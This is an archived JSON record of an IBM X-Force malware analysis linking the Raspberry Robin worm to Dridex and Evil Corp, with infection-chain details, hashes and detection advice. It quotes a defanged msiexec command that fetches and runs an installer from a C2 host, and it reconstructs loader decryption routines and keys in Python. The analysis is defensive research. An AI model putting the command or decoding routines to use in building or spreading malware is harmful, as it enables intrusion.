{
    "id": "e7bcb73a-5b07-4718-9bde-0c82ed982cee",
    "created_at": "2023-01-12T15:10:39.324328Z",
    "updated_at": "2025-03-27T02:13:16.589239Z",
    "deleted_at": null,
    "sha1_hash": "db5d0358ccc50ce529188d7feb3665e03e406e1c",
    "title": "2022-09-01 - Raspberry Robin and Dridex- Two Birds of a Feather",
    "authors": "",
    "file_creation_date": "2022-09-12T12:00:56Z",
    "file_modification_date": "2022-09-12T12:00:56Z",
    "file_size": 1769624,
    "plain_text": "# Raspberry Robin and Dridex: Two Birds of a Feather\n\n**[securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/](https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/)**\n\n[Intelligence & Analytics\nSeptember 1, 2022](https://securityintelligence.com/category/topics/security-intelligence-analytics/)\nBy [Kevin Henson co-authored by\nEmmy Ebanks\n8 min read](https://securityintelligence.com/author/kevin-henson/)\nIBM Security Managed Detection and Response (MDR) observations coupled with IBM\nSecurity X-Force malware research sheds additional light on the mysterious objectives of the\noperators behind the Raspberry Robin worm. Based on a comparative analysis between a\n\n\n-----\n\ndownloaded Raspberry Robin DLL and a Dridex malware loader, the results show that they\nare similar in structure and functionality. Thus, IBM Security research draws another link\nbetween the Raspberry Robin infections and the Russia-based cybercriminal group ‘Evil\nCorp,’ which is the same group behind the Dridex Malware, suggesting that Evil Corp is likely\nusing Raspberry Robin infrastructure to carry out its attacks.\n\nWhen Raspberry Robin infection attempts were first observed impacting a few IBM Security\nMDR customers in mid-May 2022, the enigmatic worm activity began to quickly spread within\na client’s network from users sharing USB devices. The infections spiked in early June and\nby early August spikes of Raspberry Robin infection attempts were observed in 17% of\nworldwide MDR clients in the oil and gas, manufacturing, and transportation industries. This\nnumber is significant as historically less than 1% of MDR clients have seen the same strain\nof malware.\n\n## Raspberry Robin and Evil Corp Connection\n\nThe ultimate objective of Raspberry Robin had been unknown. Microsoft researchers\nobserved millions of Raspberry Robin infections, but no evidence of post-infection exploits\n[had been seen in the wild until July 26, 2022, when Microsoftdisclosed that they had](https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/#DEV-0206-DEV-0243)\nuncovered existing Raspberry Robin infections delivering FAKEUPDATES malware (aka\nSocGholish).\n\nThe disclosure by the Microsoft threat researchers revealed that the “… DEV-0206associated FAKEUPDATES activity on affected systems has since led to follow-on actions\nresembling DEV-0243 pre-ransomware behavior.” This statement indicates a possible\nrelationship between Raspberry Robin and DEV-0243, which the cyber intelligence\ncommunity tracks as “Evil Corp”.\n\nThe relationship between the threat actor behind FAKEUPDATES and Evil Corp is not new.\nEvil Corp had been leveraging FAKEUPDATES since at least April 2018 as the initial\ninfection vector for the info-stealing Dridex malware that later resulted in deployment of\nDOPPLEPAYMER ransomware.\n\nThe US Treasury sanctioned Evil Corp in 2019 but the group had already begun deploying\ncustom ransomware-as-a-service (RaaS) payloads, rebranding them as WastedLocker,\nbefore shifting to the well-known RaaS LockBit ransomware. Using RaaS allows Evil Corp to\nblend in with other affiliates that would hinder attribution and ultimately skirt around\nsanctions.\n\n## Raspberry Robin Infection Chain\n\n\n-----\n\nRaspberry Robin, also known as the QNAP worm, is typically delivered by a USB device,\nwhich contains a malicious Microsoft shortcut (.LNK) file. Once the user clicks on the .LNK\nfile, it spawns a malicious command referencing msiexec.exe, a legitimate Windows system\nutility, to download and execute an MSI installer from a command and control (C2) domain.\nThe C2 domain is usually recently registered, comprised of a few characters, and hosts a\ncompromised QNAP NAS device that serves up a login page.\n\nThe msiexec commands observed by the IBM Security MDR team uses mixed-case syntax\nto evade detection, contain the victim’s hostname and username, and connect over a nonstandard HTTP port 8080:\n```\nCommand Line: msieXeC /q /I \"S8 [.]Cx:8080/random\nstring/coMpUTErname=USER\"\n\n```\nDuring the infection, msiexec.exe also utilizes other legitimate Windows system utilities and\ntools, known as living-off-the-land binaries (LOLBin) such as rundll32.exe, fodhelper.exe,\nregsvr32.exe, dllhost.exe, and odbcconf.exe to load and execute the downloaded Raspberry\nRobin loader dynamic link libraries (DLL). Representative samples of such DLLs were\nanalyzed in-depth by IBM X-Force reverse engineers.\n\n## X-Force Malware Research\n\nX-Force analyzed two components that have been attributed to a Raspberry Robin infection.\nThe components are two dynamic link libraries (DLLs) hereafter referred to as Raspberry\n[Robin loaders that were previously analyzed by Red Canary. As mentioned above, the](https://redcanary.com/blog/raspberry-robin/)\nloaders were downloaded as a result of a victim clicking a malicious .LNK file which launched\nmsiexec to download and execute an MSI installer. The MSI Installer then drops a Raspberry\nRobin loader to the system. X-Force reverse engineers performed analysis to provide\nadditional details about the operation and structure of Raspberry Robin loader variants and\ncompared one variant to a 64-bit Dridex loader.\n\nThis comparative analysis provided information that helps draw a link between Raspberry\nRobin infections and Dridex malware loaders. The comparative analysis revealed that the\ntwo are very similar in functionality and structure. The intermediate loaders, decoded by\neach, were also found to be similar, containing code to perform hook detections and using\nsimilar algorithms to decode the payload.\n\n### Analysis Details (Raspberry Robin Loaders)\n\nThe Raspberry Robin loaders are DLLs that decode and execute an intermediate loader. The\nintermediate loader performs hook detection as an anti-analysis technique, decodes its\nstrings at runtime and then decodes a highly obfuscated DLL whose purpose has not been\ndetermined.\n\n\n-----\n\n### Raspberry Robin Loader Variant 1 (SHA256: c0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c)\n\nUpon execution, Raspberry Robin Loader variant 1 enters a loop where it calculates the\nCRC32 hash of an encrypted block of data for 0x13h (29) iterations. One theory is this\ncalculation loop is possibly a delayed attempt as the loader does not appear to use the hash\nin any additional operations. During stage 1 of the payload decryption process, the DLL\nutilizes an array of indexes and sizes. Each index points to a block of the encrypted payload.\nThe block is then shifted, and the result is later XOR decrypted with a 64-byte key.\n\n_Figure 1 — Structure of the decryption components and encrypted payload embedded in a_\n_Raspberry Robin Loader_\n\nAdditionally, the loader decodes the first 0x117 (279) bytes of its .text PE section starting at\nraw offset 0x400. The decoding algorithm is represented by the python code below:\n```\nkey = 0xC2D16F15\n\n```\n\n-----\n\n```\ndec bytearray()\nfor b in data:\nkey_byte = (key & 0xFF)\ndec.append(b ^ key_byte)\nkey = rotate_right(key, 8)\n\n```\nThe decoded code finds the loaded kernel32.dll by enumerating through loaded modules\nlooking for names that have a “.” as the 16th character and “32” starting at position 12 in the\nwide-formatted name. The loader continues execution passing the hash value 0xFC910371\nand kernel32.dll’s base address to a function that enumerates the library’s export table. This\nfunction calculates a hash of each exported function name to resolve the VirtualAlloc() API\nfunction.\n\nThe function VirtualAlloc() is used to allocate a buffer to which the first decrypted payload is\ncopied. The payload is then XOR decrypted with a 64-byte key.\n\n### Raspberry Robin Loader Variant 2 (SHA256: 1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1)\n\nUpon execution, Raspberry Robin Loader variant 2 attempts to detect hooks in the function\n_wglGetProcAddress(). This variant attempts to detect hooks in the LdrLoadDll() function. This_\nis performed as an anti-analysis technique that helps the malware determine if the process is\nbeing monitored by security software. Specifically, the intermediate loader checks for the\njump instructions 0xFF25 and 0xB8.\n\n_Figure 2 — Intermediate Loader’s hook detection function_\n\nThen it proceeds to create an 88-byte structure used to store data used during\nexecution. This loader also contains obfuscated notable API function and library names\nwhich are decoded by subtracting each byte in the 16-byte key,\n0xB6B6AF8660D4760385C431119F7DE2B6 from the encoded string byte\n\n\n-----\n\nNext, the loader RC4 decrypts an intermediate loader using the 32-byte key:\n0x300EAEBAAF2512BFA8B473A085005D629CA9D2A79A8BD924687C04D7605E3015.\n\nOnce decrypted, the intermediate loader contains a malformed PE header. The malformed\nPE header is later patched with the appropriate values to allow execution of the module.\nNotably, the intermediate loader, discussed in the next section also patches the header of its\npayload during execution.\n\n_Figure 3 — Decrypted intermediate Loader’s malformed PE header_\n\n### Intermediate Loader\n\nThe intermediate loader is responsible for decrypting and executing the final payload.\nUltimately, the intermediate loader copies the final payload to the process space of the\noriginal loader, Raspberry Robin Loader variant 2 and then executes it.\n\nDuring execution, the intermediate loader decodes library and API function names using\ninline decoding algorithms and then resolves the function addresses via a call to\n_LdrGetProcedureAddress(). The function LdrGetProcedureAddress() is obtained by_\nenumerating ntdll.dll’s export table.\n\n_Figure 4 — Inline decoding algorithm used to decode library and API function names._\n\nThe decoded library and function names from the intermediate loader are shown below:\n```\nLdrGetProcedureAddress\nkernel32.dll\n\n```\n\n-----\n\n```\nLoadLibraryA\nGetPrcAddress\nVirtualAlloc\nVirtualProtect\n\n## Comparative Analysis (Raspberry Robin Loader vs. Dridex Loader)\n\n```\nX-Force performed a comparative analysis of a 32-bit Raspberry Robin downloaded loader\nand a 64-bit Dridex loader. This comparative analysis provided information that draws a link\nbetween Raspberry Robin loaders and Dridex malware loaders. The comparative analysis\nrevealed that the two are very similar in functionality and structure. The intermediate loaders\ndecoded the final payload in a similar manner and contained anti-analysis code that\nperformed hook detection in the LdrLoadDll() function.\n\nComparative analysis of the two samples reveals the following:\n\n**File Hashes**\n\n\nRaspberry\nRobin\nLoader\nvariant 1\n\nDridex\nLoader\n\n\n1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1\n\nb30b76585ea225bdf8b4c6eedf4e6e99aff0cf8aac7cdf6fb1fa58b8bde68ab3\n\n\nThe string decoding algorithms are similar, subtracting the key byte from the encoded byte.\n\n\n-----\n\n_Figure 5 — String decoding algorithm found in Raspberry Robin Loader and Dridex Loader_\n\nBoth contain seemingly random strings in the PE’s data section.\n\n_Figure 6 — Seemingly random strings found in Raspberry Robin Loader and Dridex Loader_\n\nThe samples contain similar inline loops that decode notable strings.\n\n_Figure 7 — Inline string decoding algorithms found in Raspberry Robin Loader and Dridex_\n_Loader_\n\n\n-----\n\nNotably, an RC4 decryption function is called at the end of the function containing the above\nloops. Subsequently, values such as the encrypted payload offset and size are assigned to a\nstructure as shown below.\n\n_Figure 8 — Values assigned to a structure. The values represent the size and offset of the_\n_payload_\n\nThe PE header of the decrypted components is malformed in memory. As a result, the\nmalware “fixes” the component to have the proper header by adding the “MZ (0x4D5A)”\nmagic bytes to the header.\n\n\n-----\n\n_Figure 9 — Malformed header is patched with the appropriate values_\n\n## Intermediate Loader Comparisons\n\nThe intermediate loaders between the two are similar containing code to perform hook\ndetection in the LdrLoadDll() function. Detecting hooks in the function allows the malware to\ndetermine if the process is being monitored by antivirus software.\n\nThe final payload is also decoded using the algorithm represented by the following Python\ncode:\n```\ndecrypted_payload = bytearray(payload)\nindex = 0\nsize = len(payload)\nwhile index != 254:\npayload_idx = lookup_table[index*4]\nwhile True:\nif payload_idx >= size:\nbreak\nkey_idx = payload_idx & 0x1F\nkey_byte = key[key_idx]\ndecrypted_byte = (payload[payload_idx] - key_byte) & 0xFF\ndecrypted_payload[payload_idx] = decrypted_byte\npayload_idx += 0xFF\nindex += 1\n\n## Recommendations\n\n```\nIt is important to note that Raspberry Robin’s initial access is by the user plugging in an\ninfected USB drive to a computer, which is a social engineering technique. The IBM Security\nMDR team tools effectively block Raspberry Robin. Further, there are multiple detection\nopportunities for Security professionals to help organizations to detect and prevent\nRaspberry Robin:\n\nImplement security awareness training.\nSearch for the IOCs in your environment.\nInstall/Deploy EDR monitoring solutions\n\n\n-----\n\nLeverage your EDR solution to disable or track USB devices connections.\nDisable the AutoRun feature in the Windows operating system settings.\n\n## IOCs\n\n### File Hashes\n\n\nRaspberry\nRobin\nLoader\nVariant 1\n\nRaspberry\nRobin\nLoader\nVariant 2\n\nDridex\nLoader\n\n\nc0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c\n\n1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1\n\nb30b76585ea225bdf8b4c6eedf4e6e99aff0cf8aac7cdf6fb1fa58b8bde68ab3\n\n\n### Command Line\n```\nmsieXeC /q /I \"S8 [.]Cx:8080/random string/coMpUTErname=USER\"\n\n```\n[Kevin Henson](https://securityintelligence.com/author/kevin-henson/)\nMalware Reverse Engineer, IBM\n\nKevin joined IBM Security’s X-Force IRIS team as a Malware Reverse Engineer in November\n2018 after 21 years of experience in supporting various commercial,...\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-01 - Raspberry Robin and Dridex- Two Birds of a Feather.pdf"
    ],
    "report_names": [
        "2022-09-01 - Raspberry Robin and Dridex- Two Birds of a Feather.pdf"
    ],
    "threat_actors": [
        {
            "id": "6c4f98b3-fe14-42d6-beaa-866395455e52",
            "created_at": "2023-01-06T13:46:39.169554Z",
            "updated_at": "2025-03-27T02:00:03.011739Z",
            "deleted_at": null,
            "main_name": "Evil Corp",
            "aliases": [
                "GOLD DRAKE"
            ],
            "source_name": "MISPGALAXY:Evil Corp",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2eb5ae35-e3ae-4b76-a945-5e6c2cfc1942",
            "created_at": "2024-02-02T02:00:04.028297Z",
            "updated_at": "2025-03-27T02:00:03.292702Z",
            "deleted_at": null,
            "main_name": "Mustard Tempest",
            "aliases": [
                "DEV-0206",
                "Purple Vallhund"
            ],
            "source_name": "MISPGALAXY:Mustard Tempest",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ebc139d2-7450-46f5-a9e4-e7d561133fa5",
            "created_at": "2024-04-24T02:00:49.453475Z",
            "updated_at": "2025-03-27T02:00:55.41974Z",
            "deleted_at": null,
            "main_name": "Mustard Tempest",
            "aliases": [
                "Mustard Tempest",
                "DEV-0206",
                "TA569",
                "GOLD PRELUDE",
                "UNC1543"
            ],
            "source_name": "MITRE:Mustard Tempest",
            "tools": [
                "SocGholish",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b296f34c-c424-41da-98bf-90312a5df8ef",
            "created_at": "2024-06-19T02:03:08.027585Z",
            "updated_at": "2025-03-27T02:05:17.350153Z",
            "deleted_at": null,
            "main_name": "GOLD DRAKE",
            "aliases": [
                "Indrik Spider ",
                "Evil Corp"
            ],
            "source_name": "Secureworks:GOLD DRAKE",
            "tools": [
                " Cobalt Strike",
                " Covenant",
                " Donut",
                " Dridex",
                " Hades",
                " Koadic",
                " LockBit",
                " Macaw Locker",
                " Mimikatz",
                " Payload.Bin",
                " Phoenix CryptoLocker",
                " PowerSploit",
                " Powershell Empire",
                " SocGholish",
                " WastedLocker",
                "BitPaymer"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536239,
    "ts_updated_at": 1743041596,
    "ts_creation_date": 1662984056,
    "ts_modification_date": 1662984056,
    "files": {
        "pdf": "https://archive.orkl.eu/db5d0358ccc50ce529188d7feb3665e03e406e1c.pdf",
        "text": "https://archive.orkl.eu/db5d0358ccc50ce529188d7feb3665e03e406e1c.txt",
        "img": "https://archive.orkl.eu/db5d0358ccc50ce529188d7feb3665e03e406e1c.jpg"
    }
}